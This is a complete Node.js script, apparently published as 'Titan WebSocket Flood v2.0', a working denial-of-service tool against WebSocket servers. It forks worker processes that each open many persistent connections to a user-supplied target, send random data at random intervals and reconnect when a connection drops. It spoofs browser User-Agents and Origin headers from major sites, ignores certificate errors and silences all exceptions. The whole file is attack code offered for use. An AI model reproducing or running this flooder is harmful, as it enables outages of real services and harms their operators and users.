#!/usr/bin/env node
// ============================================================
// Titan WebSocket Flood v2.0
// Author: github.com/thesystemowner
// Technique: Persistent WS connections + data injection
// ============================================================

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.setMaxListeners(0);

const WebSocket = require('ws');
const url = require('url');
const cluster = require('cluster');
const crypto = require('crypto');

const args = process.argv.slice(2);
if (args.length < 3) {
    console.log(`Usage: node titan-ws.js <ws:// or wss:// url> <time> <connections> [threads]`);
    process.exit(1);
}

const target = args[0];
const duration = parseInt(args[1]);
const conns = parseInt(args[2]);
const threads = parseInt(args[3]) || 1;

const UAs = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36',
];

const originHeaders = [
    'https://www.google.com', 'https://www.facebook.com', 'https://www.youtube.com',
    'https://www.instagram.com', 'https://www.reddit.com', 'https://www.bing.com',
];

function randStr(len) {
    return crypto.randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len);
}

function createWS() {
    const ua = UAs[Math.floor(Math.random() * UAs.length)];
    const headers = {
        'User-Agent': ua, 'Origin': originHeaders[Math.floor(Math.random() * originHeaders.length)],
        'Pragma': 'no-cache', 'Cache-Control': 'no-cache',
        'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits',
        'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9',
    };

    const ws = new WebSocket(target, {
        headers, handshakeTimeout: 15000, perMessageDeflate: true,
        rejectUnauthorized: false, followRedirects: true,
    });

    ws.on('open', () => {
        const interval = setInterval(() => {
            if (ws.readyState === WebSocket.OPEN) {
                try { ws.send(randStr(Math.floor(Math.random() * 1024) + 64)); } catch { }
            } else { clearInterval(interval); }
        }, Math.random() * 5000 + 100);

        ws.on('close', () => { clearInterval(interval); setTimeout(createWS, 100); });
        ws.on('error', () => { clearInterval(interval); ws.close(); });
    });
    ws.on('unexpected-response', () => ws.close());
}

if (cluster.isMaster) {
    console.log(`[+] Titan WebSocket Flood`);
    console.log(`[+] Author: github.com/thesystemowner`);
    console.log(`[+] Target: ${target}`);
    console.log(`[+] Duration: ${duration}s`);
    console.log(`[+] Connections per thread: ${conns}`);
    console.log(`[+] Threads: ${threads}`);

    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => { console.log('[+] Done'); process.exit(0); }, duration * 1000);
} else {
    for (let i = 0; i < conns; i++) setTimeout(createWS, i * 50);
}
